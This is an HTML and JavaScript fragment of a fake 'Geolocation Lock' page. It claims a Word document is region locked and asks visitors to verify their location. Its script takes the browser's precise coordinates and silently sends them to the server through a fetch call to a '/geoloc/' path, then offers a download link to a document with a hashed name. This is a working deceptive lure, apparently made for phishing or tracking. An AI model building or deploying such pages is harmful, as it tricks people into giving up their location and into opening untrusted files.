                        			<h3>Geolocation Lock</h3>
                            		<p>The document <i><b>045872_B.docx</b></i> is region locked per country. Click below to determine if you are in the allowed region.</p>
                        		</div>

                        			<i class="fa fa-lock"></i>
                        		</div>

			                        <p id="demo"></p>
		                          </div>

        <!-- Javascript -->
        <script>
          var x = document.getElementById("demo");
          var y = document.getElementById("buttonzorp");

          function getLocation() {
              y.innerHTML = "Check in progress";
              if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(showPosition, showError);
              } else {
                  x.innerHTML = "Geolocation is not supported by this browser.";
              }
          }

          function showPosition(position) {
            //  x.innterHTML = "Click <a href='#'>here</a> to download document. <img src=/geoloc/" + position.coords.latitude + "_" + position.coords.longitude +  ">";
            y.innerHTML = "Check";
            x.innerHTML = "Location accepted. Click <a href='591af0b8c630d30b4093b90bf09bd662.docx'>here</a> to download document.";
            fetch("/geoloc/" + position.coords.latitude + "_" + position.coords.longitude);
          }

          function showError(error) {
              switch(error.code) {
                  case error.PERMISSION_DENIED:
                      x.innerHTML = "User denied the request for Geolocation. Unable to provide download link."
                      break;
                  case error.POSITION_UNAVAILABLE:
                      x.innerHTML = "Location information is unavailable. Unable to provide download link."
                      break;
                  case error.TIMEOUT:
                      x.innerHTML = "The request to get user location timed out. Unable to provide download link."
                      break;
                  case error.UNKNOWN_ERROR:
                      x.innerHTML = "An unknown error occurred. Unable to provide download link."
                      break;
              }
          }
          </script>
